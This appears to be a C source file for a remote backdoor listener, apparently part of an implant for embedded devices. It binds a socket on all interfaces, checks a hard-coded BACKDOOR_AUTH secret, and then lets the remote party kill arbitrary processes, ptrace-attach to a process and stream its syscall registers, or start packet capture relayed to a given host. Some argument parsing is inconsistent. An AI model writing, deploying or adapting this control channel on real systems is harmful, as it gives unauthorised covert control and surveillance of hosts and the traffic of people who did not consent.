#include "remote.h"
#include <netinet/in.h>
#include <signal.h>
#include <string.h>
#include <errno.h>
#include <sys/ptrace.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>
#include <sys/wait.h>
#include "connection.h"
#include "thread_producer.h"

//int accept_sock = 0, remote_sockfd = 0;

void remote_handler(int device_server_id, char* ip, int port, int remote_port) {
	
	remote_sockfd = 0;
	accept_sock = 0;
	remote_sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	int x = 1;
	setsockopt(remote_sockfd, SOL_SOCKET, SO_REUSEADDR, &x, sizeof(int));
	struct sockaddr_in listener;
	listener.sin_family = AF_INET;
	listener.sin_port = htons(remote_port);
	if (inet_pton(AF_INET, "0.0.0.0", &listener.sin_addr) < 0)
	{
		// printf("[x] remote_handler: inet_pton: %s\n", strerror(errno));
		return;
	}
	if (bind(remote_sockfd, (struct sockaddr *)&listener, sizeof(struct sockaddr_in)) < 0) {
		printf("[x] remote_handler: bind: %s\n", strerror(errno));
		return;
	}
	remote_handler_pth = 0;
	remote_job_list(device_server_id, ip, port, remote_port);
}
void remote_job_list(int device_server_id, char* ip, int port, int remote_port)
{
	while(1) {
		listen(remote_sockfd, 1);
		//printf("[!] Listening\n");
		struct sockaddr_in accept_addr;
		socklen_t l = sizeof(struct sockaddr_in);
		accept_sock = accept(remote_sockfd, &accept_addr, &l);
		if (accept_sock < 0) continue;
		int t = 1;
		setsockopt(accept_sock, SOL_SOCKET, SO_REUSEADDR, &t, sizeof(int));
		char buffer[60];
		read(accept_sock, buffer, 50);
		buffer[50] = 0;
		if (strncmp(buffer, BACKDOOR_AUTH, 50))
		{
			printf("[!] Rejected\n");
			shutdown(accept_sock, 1);
			close(accept_sock);
			continue;
		}
		printf("[!] Accepted\n");
		memset(buffer, 0, 60);
		read(accept_sock, buffer, 1);
		printf("%c....", buffer[0]);
		if (buffer[0] == '1') suicide();
		else if (buffer[0] == '2') {
			read(accept_sock, buffer, 1); // ' '
			memset(buffer, 0, 10);
			read(accept_sock, buffer, 10);
			if (atoi(buffer) > 0)
				kill_proc(atoi(buffer));
		}
		else if (buffer[0] == '3') {
			read(accept_sock, buffer, 1); // ' '
			memset(buffer, 0, 10);
			read(accept_sock, buffer, 10);
			if (atoi(&buffer[2]) > 0) process_tracing(atoi(buffer), device_server_id);
		}
		else if (buffer[0] == '4') {
			read(accept_sock, buffer, 1); // ' '
			memset(buffer, 0, 10);
			while (packet_capturing(accept_sock, device_server_id, ip, port) == 0){
				continue;
			}
		}
		if (accept_sock != 0) {
			close(accept_sock);	
			accept_sock = 0;
		}
	}
}

void suicide() {
	printf("Good bye world!\n");
	exit(0);
}

void kill_proc(int pid) {
	printf("Kill %d!\n", pid);
	kill(pid, SIGTERM);	
}

void process_tracing(int pid, int device_server_id) {

	int wstatus;
	char a = '\x00';

	if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0) {
		send_with_header_parsing_known_socket(accept_sock, 0, device_server_id, "PTRACE_ATTACH errorrrrr\n", 24);	
		return;
	}
//	waitpid(pid, 0, 0);
	while (1) {
		wstatus = 0;
		usleep(1000);
		if (send(accept_sock, &a, 1, 0) < 0) {
			puts("Connection error\n");

			kill(pid, SIGSTOP);
			waitpid(pid, 0, 0);
			ptrace(PTRACE_DETACH, pid, 0, SIGCONT);
			close(accept_sock);
			return;
		}
		if (waitpid(pid, &wstatus, WNOHANG) < 0) {
			ptrace(PTRACE_DETACH, pid, NULL, SIGCONT);
			close(accept_sock);
			return;
		}
		if (WIFSTOPPED(wstatus)) break;
	}

	while(1) {
		
		if (ptrace(PTRACE_SYSCALL, pid, 0, 0) == -1) {
			kill(pid, SIGSTOP);
			waitpid(pid, 0, 0);
			ptrace(PTRACE_DETACH, pid, 0, SIGCONT);
			send_with_header_parsing_known_socket(accept_sock, 0, device_server_id, "PTRACE_DETACH\n", 13);
			close(accept_sock);
			return;
		}

		while (1) {
			wstatus = 0;
			usleep(1000);
			if (send(accept_sock, &a, 1, 0) < 0) {
				puts("Connection_error");

				kill(pid, SIGSTOP);
				waitpid(pid, 0, 0);
				ptrace(PTRACE_DETACH, pid, 0, SIGCONT);
				close(accept_sock);
				return;
			}
			if (waitpid(pid, &wstatus, WNOHANG) < 0) {
				ptrace(PTRACE_DETACH, pid, NULL, SIGCONT);
				close(accept_sock);
				return;
			}
			if (WIFSTOPPED(wstatus)) break;
		}

		unsigned char regs[500]; // much more than real number of register
		memset(regs, 0, 500);
		char msg[1000];
		memset(msg, 0, 1000);

#ifndef __SPARC__
		if (ptrace(PTRACE_GETREGS, pid, 0, regs) < 0) {
			kill(pid, SIGSTOP);
			waitpid(pid, 0, 0);
			ptrace(PTRACE_DETACH, pid, 0, SIGCONT);
			return;
		}
#else
		if (ptrace(PTRACE_GETREGS, pid, regs, 0) < 0) {
			kill(pid, SIGSTOP);
			waitpid(pid, 0, 0);
			ptrace(PTRACE_DETACH, pid, 0, SIGCONT);
			return;
		}
#endif

#ifdef __MIPS__
		uint32_t * _regs = &regs[0];
		if(_regs[5] >= 4000) sprintf(msg, "%ld 0x%lx 0x%lx 0x%lx 0x%lx 0x%lx 0x%lx", _regs[5], _regs[7], _regs[9], _regs[11], _regs[13], _regs[15], _regs[17]);
		int i = 0;
		//for (i; i < 40; i++) printf("0x%lx ", _regs[i]);
		//puts("");
#elif defined(__X86_64__)
		uint64_t * _regs = &regs[0];
		int i = 0;
		//for (i; i < 32; i++) printf("0x%lx ", _regs[i]);
		sprintf(msg, "%ld 0x%lx 0x%lx 0x%lx 0x%lx 0x%lx 0x%lx", _regs[15], _regs[14], _regs[13], _regs[12], _regs[11], _regs[9], _regs[8]);
		//printf("%s\n", msg);
#endif
		if (strlen(msg) > 0) {
			if (send_with_header_parsing_known_socket(accept_sock, 0, device_server_id, msg, strlen(msg)) < 0 ) {
				ptrace(PTRACE_DETACH, pid, 0, SIGCONT);
				close(accept_sock);
				return;
			}
		}
		if (ptrace(PTRACE_SYSCALL, pid, 0, 0) == -1) {
			kill(pid, SIGSTOP);
			waitpid(pid, 0, 0);
			ptrace(PTRACE_DETACH, pid, 0, SIGCONT);
			send_with_header_parsing_known_socket(accept_sock, 0, device_server_id, "PTRACE_DETACH\n", 14);
			close(accept_sock);
			return;
		}	

		while (1) {	
			wstatus = 0;
			usleep(1000);
			if (send(accept_sock, &a, 1, 0) < 0) {
				puts("Connection_error");

				kill(pid, SIGSTOP);
				waitpid(pid, 0, 0);
				ptrace(PTRACE_DETACH, pid, 0, SIGCONT);
				close(accept_sock);
				return;
			}
			if (waitpid(pid, &wstatus, WNOHANG) < 0) {
				ptrace(PTRACE_DETACH, pid, NULL, SIGCONT);
				close(accept_sock);
				return;
			}
			if (WIFSTOPPED(wstatus)) break;
		}

	

	}
	
}









